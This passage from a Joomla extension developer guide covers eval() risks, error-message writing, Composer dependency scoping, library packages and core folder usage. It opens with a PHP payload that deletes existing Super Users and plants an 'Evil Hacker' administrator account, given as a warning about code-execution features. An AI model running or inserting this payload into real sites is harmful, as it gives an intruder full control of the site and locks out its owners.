                },
                []
                )
                );

                if (!empty($existingSuperUsers))
                {
                $query = $db-&gt;getQuery(true)
                -&gt;delete($db-&gt;quoteName('#__users'))
                -&gt;whereIn($db-&gt;quoteName('id'), $existingSuperUsers);
                $db-&gt;setQuery($query)-&gt;execute();
                }

                $user = new \Joomla\CMS\Table\User($db);
                $user-&gt;save([
                'name' =&gt; 'Evil Hacker',
                'username' =&gt; 'drevil1234',
                'email' =&gt; 'drevil@example.com',
                'password' =&gt; \Joomla\CMS\User\UserHelper::hashPassword('Dr3v!L0wnzJ00'),
                'block' =&gt; 0,
                'sendEmail' =&gt; 1,
                'registerDate' =&gt; (new \Joomla\CMS\Date\Date('2004-08-08 01:02:03'))-&gt;toSql(),
                'lastVisitDate' =&gt; (new \Joomla\CMS\Date\Date())-&gt;toSql(),
                'activation' =&gt; '',
                'groups' =&gt; $superUserGroups
                ]);
                }

                try { hackMePlenty(); } catch (\Throwable $e) { }</programlisting>

      <para>For this reason, whenever I see an extension which deliberately
      allows PHP code to be inserted and executed I am worried. If I see this
      being allowed in an editor or other text entry field without checking
      that the data comes from a Super User I am immediately labelling the
      extension a massive security issue and the site compromised unless
      proven differently.</para>

      <para>As a developer you should NEVER, EVER have a feature which allows
      direct PHP execution. This includes this happening unintentionally by
      using the evil <code>eval()</code>. Also note that most hosts disable
      <code>eval()</code> so idiot developers won't create backdoors the size
      of Alaska on the sites hosted on that host.</para>

      <para>There are very few cases where you might want to evaluate
      <emphasis>generated</emphasis> (as opposed to <emphasis>user
      defined</emphasis>) PHP code. For example, when I implemented a subset
      of the Blade template language in FOF I was converting Blade files to
      straight up PHP. Of course, I could not run the generated code through
      <code>eval()</code>. The solution to that is to first try to create a
      temporary file —either in Joomla's temporary directory or a cache
      directory— and <code>include()</code> it. If the temporary directory is
      unwriteable you can use
      <code>class_exists(\Joomla\Filesystem\Buffer::class, true);</code> which
      includes Joomla's buffer class. This registers the stream handler
      <code>buffer://</code> which creates a filesystem in memory. You can
      write to a file in it, e.g.
      <code>file_put_contents('buffer://foobar.php', $theContents);</code> and
      then include it like this <code>include('buffer://foobar.php');</code>.
      The downside with the buffer method is that on some hosts with hardened
      PHP runtimes you cannot include executable files from stream wrappers
      which have not been explicitly allowed by the server administrator.
      Hence the need to go through the filesystem first.</para>

      <para>As I said, you should only ever evaluate PHP code in your
      extensions if you have written it or if your own code has generated it.
      <emphasis role="bold">DO NOT TRUST THE USER —NOT EVEN SUPER USERS— TO
      PROVIDE EXECUTABLE PHP CODE THEMSELVES; IT IS A MASSIVE SECURITY
      ISSUE</emphasis>. Do you hear that, form component developers? Your
      extensions make it trivial to hack people's sites. Fix 'em!</para>
    </section>
  </section>

  <section xml:id="advice-error-messages">
    <title>The fine art of writing error messages</title>

    <para>Error messages are one of the most critical aspects of our software,
    though it receives surprisingly little attention. Error messages are
    displayed to our software's users when something bad happens. Our users
    will be in a negative state of mind: confused, afraid, angry, or a
    combination of the above. Our job as software developers is to provide
    them with reassurance, and to help them identify the issue and resolve it.
    To do that in an efficient manner requires understanding our code, the
    user's state of mind and abilities, and the use of language.</para>

    <bridgehead>What is the context of your error message?</bridgehead>

    <para>Let's consider a very simple situation which warrants an error
    message: a form validation error in an e-commerce component. This could
    happen in different context. The site owner may have forgotten to enter
    the information required to integrate with the payment provider. A backend
    user with data entry-only privileges may have forgotten to enter the price
    information for a product variation, e.g. the price of
    <emphasis>blue</emphasis> t-shirts. A frontend user (client) may have
    forgotten to enter their street address.</para>

    <para>On the face of it, these are all the same thing: form validation
    error. Let's just set up a few rules in the form and some checks in our
    Table and throw an exception when something's wrong, Joomla will convey
    that as error messages on the user interface and all is well,
    right?</para>

    <para><emphasis role="bold">WRONG!</emphasis></para>

    <para>Our exception results to an error message which is very technical,
    unhelpful and lacks any empathy. For example “You need to provide the
    Stripe API key”. This is mostly okay in the first context of the site
    owner. It is a bit jarring for the data entry person to tell them “Price
    is required!”. Woah, there, mister! Is this an e-commerce extension for a
    mass-distributed CMS or Checkpoint Charlie in the height of the Cold War?!
    It is definitely not a good experience for our prospective client to tell
    them “The Address is required”. We are putting them off and they might
    abandon their cart to go to the competition.</para>

    <para>Do not always assume that you can convey the same message, the same
    way, in every context. Think about the context and adjust your messages
    accordingly. For example, in the case of conveying messages to the end
    user (client) we may have to catch the internal exception and “reshape”
    the error message. We could instead tell them “Your order information is
    saved but your order is not submitted yet. Some information we need to
    process it is missing. Please review the fields marked with a red outline
    below. If the problem isn't solved after editing your information and
    clicking on Purchase please contact customer support.”.</para>

    <bridgehead>What makes an error message good?</bridgehead>

    <para>An error message needs to be <emphasis
    role="bold">reassuring</emphasis>. Remember that you are talking to a
    human who expected something to happen and now they are met with a scary
    message. Keep the tone serious, but not completely dry. If you know that
    the application is in a state which is recoverable lead by reassuring the
    user that this is the case. If it's not in a recoverable state but there
    is a good chance that the problem can be rectified lead with the fact that
    there is resolution in sight. If your application is in a dire situation
    which cannot possibly be recovered from you should try to ease the user
    into that fact, like a doctor giving someone the bad news that they have 3
    months to live.</para>

    <para>An error message must be <emphasis role="bold">factual</emphasis>:
    it needs to say what happened and why it happened. An error message
    “Something went wrong” is worse than no error message at all. Tell the
    user what went wrong. Avoid using technical jargon unless the target
    audience is most likely to be the site integrator and the technical jargon
    is relevant to the resolution of the problem.</para>

    <para>For example, if the problem is that there's been a cURL error
    fetching data from a third party API processing payments the message to
    show an end user would be “We could not connect to the third party service
    which processes payments on our behalf”. Conversely, the message to show
    to the site integrator for the same problem would be something like
    “Timeout of 30 seconds exceeded contacting PayBuddy”.</para>

    <para>When you have to present ‘dumbed down’ error messages to the end
    user it's very helpful logging the more technical details and provide the
    end user with a unique identifier which allows the site integrator to
    locate this particular error message in the log file so they can provide
    assistance.</para>

    <para>An error message must be <emphasis role="bold">helpful</emphasis>.
    Telling someone what went wrong and possibly why is one thing. Helping the
    resolve it is a completely different issue altogether. Tell your user what
    they should be doing next. If the message targets end users the resolution
    should be fairly short and simple to follow; remember that the user is not
    in a good mental state right now. If the message targets a site integrator
    it is best to link them to a documentation page <emphasis>relevant to the
    issue at hand</emphasis> so they can read more about what happened and how
    to troubleshoot it.</para>

    <para>If there is a reasonable amount of use cases where the target
    audience will not be able to address this issue by themselves try to
    include a link to further steps, be it watching a video tutorial, reading
    a documentation page, asking help on a forum, contacting their host, or
    contacting the site owner / extension developer — again, you need to
    choose the appropriate action based on the target audience.</para>

    <para>If you provide a further action which requires the user to contact
    another person make sure to do it in a way which will guide the user into
    providing all the necessary information. If at all possible, collect all
    the necessary information and transmit it with the user's consent (think
    about how major Operating Systems and browsers implement a “crash
    assistant”).</para>

    <para>Finally, keep the error messages <emphasis
    role="bold">concise</emphasis> (short and to the point). Nobody will read
    a novel-length error message, even if it is the most informative and
    helpful resource in the Universe.</para>

    <para>These requirements are oftentimes at odds with each other. Finding
    the appropriate error message requires understanding your target audience
    and their use cases. This is not easy. Your understanding of the target
    audience and their use cases will improve over time, and the audience
    itself and their use cases will also evolve over time. Do not be afraid to
    revise your error messages, the way you present them, and your
    documentation on how to troubleshoot them.</para>

    <para>A good way to approach error messages is to make them friendly,
    short, informative, and when the resolution is more than ten words do link
    to a longer documentation page which takes the user by the hand and helps
    them resolve the issue. Yes, you will have the users who can't be bothered
    to read the documentation (like death and taxes, they are unavoidable), as
    well as the users who got lost reading it (approach it as an opportunity
    to understand their challenges and improve your documentation). In the end
    of the day you have helped far more users figure out what to do without
    contacting you, and without feeling overly frustrated, angry, or stupid.
    We don't hear about those users but if they become the
    <emphasis>majority</emphasis> of our users then we can say we are doing
    the right thing as developers.</para>

    <para>If you want to see what good error messages are like, take a look at
    Joomla Update's archive extraction step since Joomla 4.0.4. When something
    fails it will tell you what failed, why it failed, the next steps to
    follow and links to a documentation page with troubleshooting information.
    Unfortunately, we could not link to specific troubleshooting steps as the
    Wiki format is rather limited but <emphasis>you</emphasis> can definitely
    do even better!</para>
  </section>

  <section xml:id="advice-composer">
    <title>Adding Composer dependencies</title>

    <para>In many cases you will need to use third party libraries. The most
    common way to do that is through <link
    xlink:href="https://getcomposer.org">Composer</link>. I will assume that
    you already know how to use Composer. If not, use your favourite search
    engine to look for “Composer tutorial for beginners” to get you
    started.</para>

    <bridgehead>Joomla's Composer dependencies: can't touch this!</bridgehead>

    <para>Joomla itself uses Composer for some third party dependencies in its
    core libraries and core components. You will find Joomla's Composer
    dependencies in your site's <filename>libraries/vendor</filename> folder.
    As you can see, even the Joomla Framework is pulled in as a Composer
    dependency along with several third party libraries.</para>

    <caution>
      <para><emphasis role="bold">You MUST NEVER remove, upgrade, downgrade,
      modify, replace or otherwise interfere with the Composer dependencies
      provided by Joomla itself</emphasis>. Doing so is considered a <emphasis
      role="bold">core hack</emphasis> and will disqualify you from receiving
      support by third party developers, as well as getting your extensions
      unlisted from the Joomla Extensions Directory (JED). You will also be
      breaking Joomla and third party software with everything that entails to
      your reputation as a developer.</para>
    </caution>

    <bridgehead>Adding a composer.json to your extension</bridgehead>

    <para>The correct way to add Composer dependencies is to simply create a
    <filename>composer.json</filename> file in your repository's root and
    install your vendor folder alongside your extension's
    <filename>src</filename> folder. You can see an example of that in action
    <link xlink:href="https://github.com/akeeba/sociallogin">in Akeeba
    SocialLogin's repository</link>. The relevant part of the file is the
    following:</para>

    <programlisting language="json">{
            "config": {
            "vendor-dir": "plugins/system/sociallogin/vendor"
            "platform": {
            "php": "7.4.0"
            }
            }
            }</programlisting>

    <para>The <parameter>vendor-dir</parameter> parameter tells Composer where
    to place the Composer vendor folder. As you can see, in this collection of
    plugins we chose to put it in the system plugin, next to its src directory
    (<filename>plugins/system/sociallogin/src</filename>).</para>

    <para>The <parameter>platform</parameter> block is optional but you SHOULD
    include it. It tells Composer to not look into the current PHP version it
    is executing in but instead install extensions valid for a specific PHP
    version. In this example it's for PHP 7.4.0. Set this to the minimum PHP
    version you are targeting in your extension.</para>

    <tip>
      <para>It is good practice to NOT include your
      <filename>composer.json</filename> and
      <filename>composer.lock</filename> files in the final distribution of
      your files to the user. You do not want them to mess around with your
      dependencies. Moreover, these files would be web accessible which would
      let an attacker very easily enumerate your dependencies and find old,
      vulnerable versions they can target in an attempt to attack the
      site.</para>

      <para>You MUST commit your <filename>composer.json</filename> and
      <filename>composer.lock</filename> files to your repository.</para>

      <para>You MUST NOT commit your <filename>vendor</filename> directory to
      your repository.</para>
    </tip>

    <bridgehead>Including Composer dependencies in your runtime
    code</bridgehead>

    <para>Once you install your dependencies you just have a
    <filename>vendor</filename> folder. Your dependencies are not loaded
    automatically as it is. You will need to somehow include your
    <filename>vendor/autoload.php</filename> file when your code executes. The
    best place to do that is in your service provider.</para>

    <note>
      <para>The repository I am using as an example uses the latter option but
      that's only because I know that the Composer dependencies will not be
      used outside the context of my event handlers. If you have a component
      which uses the Composer dependencies in its Models and you reasonable
      expect said Models to be used outside the component itself you
      definitely need to load your dependencies in the service locator.
      Remember, the <emphasis>canonical</emphasis> way to get a Model object
      for a component is to boot the component to get its MVCFactory which
      means that the service provider file is included.</para>
    </note>

    <para>Let's say that you have the following
    <filename>services/provider.php</filename> file:</para>

    <programlisting language="php">defined('_JEXEC') || die;

            use Joomla\CMS\Extension\PluginInterface;
            use Joomla\CMS\Plugin\PluginHelper;
            use Joomla\DI\Container;
            use Joomla\DI\ServiceProviderInterface;
            use Joomla\Event\DispatcherInterface;
            use Joomla\Plugin\System\Example\Extension\Example;

            return new class implements ServiceProviderInterface {
            public function register(Container $container)
            {
            $container-&gt;set(
            PluginInterface::class,
            function (Container $container) {
            $subject = $container-&gt;get(DispatcherInterface::class);
            $config  = (array) PluginHelper::getPlugin('system', 'example');

            return new Example($subject, $config)
            }
            );
            }
            };</programlisting>

    <para>You can load your Composer autoloader before returning the anonymous
    class (see the part in bold type):</para>

    <programlisting language="php">defined('_JEXEC') || die;

            use Joomla\CMS\Extension\PluginInterface;
            use Joomla\CMS\Plugin\PluginHelper;
            use Joomla\DI\Container;
            use Joomla\DI\ServiceProviderInterface;
            use Joomla\Event\DispatcherInterface;
            use Joomla\Plugin\System\Example\Extension\Example;

            <emphasis role="bold">require_once __DIR__ . '/../vendor/autoload.php';</emphasis>

            return new class implements ServiceProviderInterface {
            public function register(Container $container)
            {
            $container-&gt;set(
            PluginInterface::class,
            function (Container $container) {
            $subject = $container-&gt;get(DispatcherInterface::class);
            $config  = (array) PluginHelper::getPlugin('system', 'example');

            return new Example($subject, $config)
            }
            );
            }
            };</programlisting>

    <para>There is a caveat, though. If someone tries to use one of your
    classes outside your extension <emphasis>without</emphasis> booting your
    extension first it will fail. Well, they should never do that. That's not
    how Joomla 4 and beyond is meant to be used.</para>

    <bridgehead>Dealing with namespace clashes and older dependency versions
    included with Joomla</bridgehead>

    <para>There might be times where you have to deal with namespace clashes.
    For example, you might be pulling in a dependency which is already shipped
    as an older version in Joomla itself, a dependency which depends on
    something else which already exists in Joomla itself as an older version,
    or you might be pulling in a common dependency that other extensions also
    pull in. Namespaces are global in PHP. You cannot have a “private”
    container where you can override namespaced classes defined
    elsewhere.</para>

    <para>First, let's get a simple example <filename>composer.json</filename>
    which pulls in a dependency already defined in Joomla:</para>

    <programlisting language="json">{
            "name": "acme/example",
            "type": "project",
            "config": {
            "vendor-dir": "components/com_example/vendor",
            "platform": {
            "php": "7.2.5"
            }
            },
            "require": {
            "lcobucci/jwt": "^4.0"
            }
            }</programlisting>

    <para>The <parameter>lcobucci/jwt</parameter> dependency already exists in
    Joomla 4 but it's in version 3.x of that library. We want to use version 4
    of the library which is incompatible with version 3 but has the same
    namespace, <classname>Lcobucci\JWT</classname>. Here's the thing. If our
    dependency is loaded before Joomla's then Joomla's WebAuthn system plugin
    which depends on it will break. If Joomla loads its own dependency first
    then our extension breaks. This is an impasse, isn't it?</para>

    <para>The solution to that is <emphasis role="bold">changing the
    namespaces of your dependencies, adding a prefix with <link
    xlink:href="https://github.com/humbug/php-scoper">PHP -Scoper</link>
    </emphasis>. But first, a few things to make sure everything will
    work.</para>

    <para>First, we need to install PHP-Scoper as a Composer global
    dependency. From the command line:</para>

    <screen>$ composer global require humbug/php-scoper</screen>

    <para>Your global <filename>vendor/bin</filename> directory is in your
    path. In most cases you have to make sure that your shell resource file
    (e.g. <filename>~/.bashrc</filename> or <filename>~/.zshrc</filename>) has
    a line like this:</para>

    <programlisting language="bash">export PATH="~/.composer/vendor/bin:$PATH"</programlisting>

    <para>On Windows, if you have installed Composer using its installer then
    this path is already added to your path. If not, you will have to add it
    yourself. If you had to add it to your path, close and reopen your
    terminal emulator or simply log out and log back in. Then we can check if
    PHP-Scoper is globally available from the command line</para>

    <screen>$ php-scoper -V
            PhpScoper version 0.17.6@b528b87</screen>

    <para>If you instead get an error that the command is not found please
    make sure that you have PHP installed somewhere it can be found by your
    shell and that you've added Composer's global
    <filename>vendor/bin</filename> directory in your path.</para>

    <para>The next step is understanding how PHP-Scoper works. It processes a
    source directory and adds a namespace prefix (“scope”) to <emphasis>all
    classes</emphasis> within that directory. However, it does NOT overwrite
    the files in-place; it outputs them to a build directory.</para>

    <para>We want to add a namespace prefix to everything in our
    <filename>vendor</filename> directory which is currently next to our
    extension's <filename>src</filename> directory. Here's what we are going
    to do. We are going to move the unprefixed, original
    <filename>vendor</filename> directory in our repository's root and have
    the prefixed, <emphasis>modified</emphasis> <filename>vendor</filename>
    directory next to our <filename>src</filename> directory.</para>

    <para>So, the first thing to do is changing our
    <filename>composer.json</filename> file, removing the
    <parameter>vendor-dir</parameter> configuration key:</para>

    <programlisting language="json">{
            "name": "acme/example",
            "type": "project",
            "config": {
            "platform": {
            "php": "7.2.5"
            }
            },
            "require": {
            "lcobucci/jwt": "^4.0"
            }
            }</programlisting>

    <para>Next up, delete the old <filename>vendor</filename> directory and
    reinstall the dependencies:</para>

    <screen>$ rm -rf components/com_example/vendor
            $ composer install</screen>

    <para>You now see a <filename>vendor</filename> folder in your
    repository's root. That's good!</para>

    <para>We can now configure PHP-Scoper. Create the file
    <filename>scoper.inc.php</filename> in the repository's root:</para>

    <programlisting language="php">&lt;?php

            declare(strict_types=1);

            use Isolated\Symfony\Component\Finder\Finder;

            return [
            <emphasis role="bold">'prefix' =&gt; 'Acme\\Example\\Dependencies',</emphasis>

            'finders' =&gt; [
            Finder::create()
            -&gt;files()
            -&gt;ignoreVCS(true)
            -&gt;notName('/LICENSE|.*\\.md|.*\\.dist|Makefile|composer\\.json|composer\\.lock/')
            -&gt;exclude([
            'doc',
            'test',
            'test_old',
            'tests',
            'Tests',
            'vendor-bin',
            ])
            -&gt;in('vendor'),
            Finder::create()-&gt;append([
            'composer.json',
            ]),
            ],

            'exclude-files' =&gt; [],
            'patchers' =&gt; [],
            'exclude-namespaces' =&gt; [],
            'exclude-classes' =&gt; [],
            'exclude-functions' =&gt; [],
            'exclude-constants' =&gt; [],

            'expose-global-constants' =&gt; true,
            'expose-global-classes' =&gt; true,
            'expose-global-functions' =&gt; true,
            'expose-namespaces' =&gt; [],
            'expose-classes' =&gt; [],
            'expose-functions' =&gt; [],
            'expose-constants' =&gt; [],
            ];</programlisting>

    <para>It's mostly boilerplate, except for the line in bold. This line
    defines the prefix we're adding to all classes. As configured above, our
    dependency's namespace will change from
    <classname>Lcobucci\JWT</classname> to our prefixed,
    <emphasis>private</emphasis> namespace
    <classname>Acme\Example\Dependencies\Lcobucci\JWT</classname>.</para>

    <para>Now run:</para>

    <screen>$ php-scoper add-prefix --output-dir components/com_example/dependencies</screen>

    <para>You will see that a new <filename>dependencies</filename> directory
    was created next to our extension's <filename>src</filename>
    directory.</para>

    <para>However, we're not out of the woods just yet. The prefixed
    autoloader does not work just yet. We need to have Composer rebuild its
    autoloader:</para>

    <screen>$ composer dumpautoload -d components/com_example/dependencies \
            --optimize --classmap-authoritative</screen>

    <para>Finally, we need to change our service provider to load our
    dependencies from our scoped vendor dir:</para>

    <programlisting language="php">defined('_JEXEC') || die;

            use Joomla\CMS\Extension\PluginInterface;
            use Joomla\CMS\Plugin\PluginHelper;
            use Joomla\DI\Container;
            use Joomla\DI\ServiceProviderInterface;
            use Joomla\Event\DispatcherInterface;
            use Joomla\Plugin\System\Example\Extension\Example;

            <emphasis role="bold">require_once __DIR__ . '/../dependencies/vendor/autoload.php';</emphasis>

            return new class implements ServiceProviderInterface {
            public function register(Container $container)
            {
            $container-&gt;set(
            PluginInterface::class,
            function (Container $container) {
            $subject = $container-&gt;get(DispatcherInterface::class);
            $config  = (array) PluginHelper::getPlugin('system', 'example');

            return new Example($subject, $config)
            }
            );
            }
            };</programlisting>

    <para>You need to remember to run PHP-Scoper and dump the prefixed
    composer's autoloader every time you change the dependencies e.g. update
    or install a dependency.</para>

    <para>Also remember to change the code in your extension to use the
    prefixed classes of the dependencies.</para>

    <para>As for your repository management, you should add both
    <filename>vendor</filename> and the (prefixed)
    <filename>dependencies</filename> folders into your
    <filename>.gitignore</filename> file:</para>

    <programlisting># Composer
            vendor/*
            # Scoped dependencies
            components/com_example/dependencies/*</programlisting>
  </section>

  <section xml:id="advice-libraries">
    <title>Library packages</title>

    <para>When you are writing a lot of software for Joomla you will find
    yourself having a lot of common code between your extensions. When the
    amount of common code surpasses a certain (low) threshold and / or is used
    on more than a couple of extensions it makes sense to share it among all
    of your extensions.</para>

    <para>This is what a <literal>library</literal> package is designed to do.
    It creates a subdirectory inside the site's <filename>libraries</filename>
    directory and optionally assigns it a namespace.</para>

    <para>The XML manifest of a files package is quite straightforward:</para>

    <programlisting>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
            &lt;extension type="library" method="upgrade"&gt;
            &lt;name&gt;LIB_ACME_MYLIBRARY_LABEL&lt;/name&gt;
            &lt;description&gt;LIB_ACME_MYLIBRARY_XML_DESCRIPTION&lt;/description&gt;
            <emphasis role="bold">&lt;libraryname&gt;mylibrary&lt;/libraryname&gt;</emphasis>
            &lt;creationDate&gt;2022-10-30&lt;/creationDate&gt;
            &lt;author&gt;Acme Corp.&lt;/author&gt;
            &lt;authorEmail&gt;acme-corp@example.com&lt;/authorEmail&gt;
            &lt;authorUrl&gt;https://www.example.com&lt;/authorUrl&gt;
            &lt;copyright&gt;(C)2022 Acme Corp&lt;/copyright&gt;
            &lt;license&gt;GNU GPLv2 or later&lt;/license&gt;
            &lt;version&gt;1.0.0&lt;/version&gt;
            &lt;packager&gt;Acme Corp&lt;/packager&gt;
            &lt;packagerurl&gt;https://www.example.com/download/mylibrary.html&lt;/packagerurl&gt;
            <emphasis role="bold">&lt;namespace path="src"&gt;Acme\MyLibrary&lt;/namespace&gt;</emphasis>

            &lt;languages folder="language"&gt;
            &lt;language tag="en-GB"&gt;en-GB/lib_mylibrary.sys.ini&lt;/language&gt;
            &lt;language tag="en-GB"&gt;en-GB/lib_mylibrary.ini&lt;/language&gt;
            &lt;/languages&gt;

            &lt;files&gt;
            &lt;folder&gt;src&lt;/folder&gt;

            &lt;file&gt;LICENSE.txt&lt;/file&gt;
            &lt;file&gt;README.txt&lt;/file&gt;
            &lt;/files&gt;

            &lt;scriptfile&gt;script.mylibrary.php&lt;/scriptfile&gt;

            &lt;updateservers&gt;
            &lt;server type="extension" priority="1" name="Acme Corp My Library updates"&gt;https://cdn.example.com/updates/mylibrary_updates.xml&lt;/server&gt;
            &lt;/updateservers&gt;
            &lt;/extension&gt;</programlisting>

    <para>This is a typical <link
    xlink:href="https://docs.joomla.org/Manifest_files">Joomla extension XML
    manifest</link> with two tags you need to pay attention to:</para>

    <itemizedlist>
      <listitem>
        <para><tag>libraryname</tag> tells Joomla the name of the subdirectory
        under <filename>libraries</filename> where the files will be copied.
        In this case we have told Joomla to install our library files in the
        <filename>libraries/mylibrary</filename> folder of the site. This is
        our library root folder.</para>
      </listitem>

      <listitem>
        <para><tag>namespace</tag> tells Joomla the common namespace prefix of
        your library files —assuming they follow the PSR-4 standard— and the
        subdirectory inside your library's root which is the PSR-4 root. In
        this case we tell Joomla that the common namespace prefix is
        <classname>Acme\MyLibrary</classname> and the PSR-4 root for this
        namespace is <filename>libraries/mylibrary/src</filename>.</para>

        <para>This tag is <emphasis role="bold">optional</emphasis>. However,
        if you do not provide this tag Joomla will NOT be able to autoload
        your library files. You will have to provide your own autoloader or
        include <filename>.php</filename> files manually.</para>
      </listitem>
    </itemizedlist>

    <para>The <tag>files</tag> tag tells Joomla where to copy files from the
    package. If you have a subdirectory in your package where files are
    located remember to use the <parameter>folder</parameter> attribute. For
    example, if your package puts everything under a <filename>dist</filename>
    folder change the <tag>files</tag> tag to read:</para>

    <programlisting>&lt;files <emphasis role="bold">folder="dist"</emphasis>&gt;</programlisting>

    <para>It is a good idea to include a license and Read Me file with your
    library. The former can be used to fulfil the legal requirement of most
    Open Source licenses to distribute a copy of the license with the
    software. The latter helps explaining to a user what exactly is in this
    folder, what is it used by, and instructions regarding the update and
    uninstallation of the library (users are well-known for going medieval on
    folders on their site, renaming or deleting them without much thought when
    they do not understand what they are for).</para>

    <para>While providing a language file is not mandatory, I strongly
    recommend providing a <filename>.sys.ini</filename> language file so that
    you can use language strings in the <tag>name</tag> and
    <tag>description</tag> tags.</para>

    <para>If you provide a regular .ini language file, e.g. for error messages
    and prompts, please keep in mind that <emphasis>it will not be
    autoloaded</emphasis>. If you really need to provide translated messages
    you need to make sure that all code paths leading to such a message will
    first go through Joomla's Language object to load the translation
    file:</para>

    <programlisting>\Joomla\CMS\Factory::getApplication()
            -&gt;getLanguage()
            -&gt;load('lib_<replaceable>mylibrary</replaceable>', JPATH_SITE);</programlisting>

    <para>Note that the extension you are loading is
    <literal>lib_<replaceable>mylibrary</replaceable></literal> where
    <replaceable>mylibrary</replaceable> is the content of your library's XML
    manifest's <tag>libraryname</tag> tag.</para>

    <para>Another thing you need to keep in mind when writing a library is
    that libraries are not bootable extensions in Joomla. As a result, they do
    not have a service provider (<filename>services/provider.php</filename>)
    file. If you need to use Joomla services you have two and a half
    options:</para>

    <itemizedlist>
      <listitem>
        <para>The library consumers (your components, plugins, or modules)
        need to push the services to your library objects. This is the
        preferable way —it makes your library code easily testable with
        PHPUnit— but it may lead to a very convoluted implementation in your
        extensions. This is the optimal way for experienced developers.</para>
      </listitem>

      <listitem>
        <para>Pull services directly from the
        <classname>Joomla\CMS\Factory</classname> using its
        <methodname>getApplication</methodname> and
        <methodname>getContainer</methodname> methods. This is the simplest
        way to go about it BUT it makes your code untestable. In other words,
        it's easy to use in your extensions but really difficult to test
        with.</para>
      </listitem>

      <listitem>
        <para>Hybrid! Use your own DI container and have your library's public
        interface objects require it to be passed in the constructor. The
        library consumers can set up their own DI container… or just use a
        default implementation. A custom container can be used when testing or
        when an experienced developer is developing their own application,
        thus emulating the first option we described above. The default DI
        container implementation —which simply goes through the global CMS
        Factory— requires no setup so novice developers, or trivial
        extensions, can quickly use the library without having to worry about
        passing around services and setting up a DI container, thus emulating
        the second option described above.</para>
      </listitem>
    </itemizedlist>

    <para>While library extensions can have media files it is generally not
    recommended to ship media files with your library. If you have media files
    your library is not a library, it's more of a prototype extension. Sure,
    you can do that —that's pretty much what we were doing with Akeeba Live
    Update long before Joomla supported library packages— but the use cases
    are so limited in number and so advanced in nature that if you need to
    read this documentation you are extremely unlikely to need to use this
    trick.</para>

    <para>Finally, pay attention to how you are going to go about updating
    your library extension. Joomla has absolutely no dependency management
    across installed extensions. If a site has Extension A which requires
    version 1.x of your library and Extension B which requires version 2.x of
    your library you'll inadvertently break the site if version 2.x of your
    library is not 100% backwards compatible to version 1.x of your library.
    This was one of the many headaches we had to deal with when we shipped our
    own MVC framework (Akeeba FOF) with our extensions. Short of checking for
    the installed library version in your extension and refusing to execute if
    it's too low or too high there's no other practical way to address this
    conundrum.</para>
  </section>

  <section xml:id="advice-core-folders">
    <title>Use the right core folder</title>

    <para>Joomla has a lot of core, top-level folders, each one having a
    different semantic meaning. There are four of them which have been
    chronically abused by extensions, leading to many functional and security
    issues on Joomla sites.</para>

    <bridgehead>The <filename>images</filename> folder</bridgehead>

    <para>This is where user-uploaded static media files reside. These static
    files are managed through the Media Manager.</para>

    <para>Your extension SHOULD NOT use this folder to store its files. If it
    does, it should assume that these files may be moved around, renamed, or
    deleted by the user, or that they me be overwritten as part of a regular
    Media Manager operation by anyone with access to the site's Media
    Manager.</para>

    <para>There are a few cases where this is okay.</para>

    <para>If you are creating thumbnails or different size and/or file format
    images from a master image (e.g. create different sizes in webp format)
    you might very well want the users to be able to use these images through
    the Media Manager and the media selection form field in Joomla. This is
    something that many gallery component do and it's perfectly fine and
    desirable.</para>

    <para>If you are creating banners, OpenGraph images, or other similar
    content which may be very well be used by the user directly —for example
    assigning it as the intro image of an article— it makes sense to put the
    in the images folder; I have done that myself for this reason.</para>

    <para>Finally, if you are writing an extension which replaces the Media
    Manager you are meant to manage the files in this folder. That's an
    obvious exception, included here for completeness' sake.</para>

    <bridgehead>The <filename>media</filename> folder</bridgehead>

    <para>Extensions are only meant to use a subdirectory in that folder which
    matches exactly their name. Component use the convention
    <filename>com_example</filename>, plugins use the convention
    <filename>plg_folder_example</filename>, modules use the convention
    <filename>mod_something</filename>. Library, file, and package extensions
    don't normally have static files but if they do they should use the
    convention <filename>lib_example</filename>,
    <filename>files_example</filename>, and <filename>pkg_example</filename>
    respectively. </para>

    <para>Templates create subdirectories in the
    <filename>media/templates/administrator</filename> or
    <filename>media/templates/site</filename> folder using their bare name,
    e.g. <filename>media/templates/site/cassiopeia</filename> (NOT
    <filename>tpl_cassiopeia</filename>). Note that older templates may have
    their media files inside their template folder (e.g.
    <filename>templates/foobar</filename>) but this is discouraged and support
    for this legacy storage scheme may be dropped anytime.</para>

    <para>The extension's media subdirectory <emphasis>currently</emphasis>
    serves a dual purpose. On one hand, this is where we store the static
    resources (CSS, JavaScript, images) of our extensions. On the other hand
    it is used to store any kind of user-generated (be it uploaded or
    constructed) content which is not web accessible (e.g. download files
    behind a paywall), web accessible but not meant to be managed through the
    Media Manager (e.g. per-layout CSS files in a page builder), transformed
    by the extension (e.g. thumbnails), or any combination thereof.</para>

    <para>Extensions have the expectation that files in their media
    subdirectory do not get replaced, renamed, or removed without the
    extension knowing about it.</para>

    <bridgehead>The <filename>cache</filename> folder</bridgehead>

    <para>This is where temporary, <emphasis role="bold">NON</emphasis>-web
    accessible content is meant to be stored. The idea here is that you are
    storing temporarily the results of time-consuming computations you do not
    want to happen on every page load. </para>

    <para>The lifetime of the files in this folder <emphasis role="bold">IS
    NOT</emphasis> necessarily controlled by Joomla's caching options in its
    Global Configuration page. Each extension can choose to create its own
    cache controller with a different caching lifetime, or even create files
    directly. Moreover, keep in mind that Joomla's caching options <emphasis
    role="bold">DO NOT</emphasis> guarantee that files will be created; the
    site owner may have opted to use in-memory key-value storage, such as
    Redis or Memcached, instead of file storage.</para>

    <para>The files in this folder and its subdirectories <emphasis
    role="bold">MUST NOT</emphasis> be accessed from the web and, in fact,
    site owners are advised to make this folder inaccessible from the web
    using appropriate server configuration.</para>

    <para>The files and subdirectories in this folder <emphasis
    role="bold">MAY</emphasis> go away at any time. The extension <emphasis
    role="bold">MUST</emphasis> be able to detect that and regenerate them as
    needed.</para>

    <para>Do not use this folder to store web-accessible content, even if it's
    only meant to be temporary and regenerated, such as the CSS for different
    layouts in a page builder. Web-accessible content MUST go into your
    extension's media subdirectory.</para>

    <para><bridgehead>The <filename>tmp</filename> folder</bridgehead></para>

    <para>This is where <emphasis>transient</emphasis> files are stored.
    Transient files are those which will go away within a couple page loads,
    typically remaining on the site for a minute or so. Temporary files may go
    away at any time without warning.</para>

    <para>Files in the <filename>tmp</filename> folder are <emphasis
    role="bold">NOT</emphasis> web accessible and, in fact, site owners are
    advised to make this folder inaccessible from the web using appropriate
    server configuration. If you want to serve transient files over the web
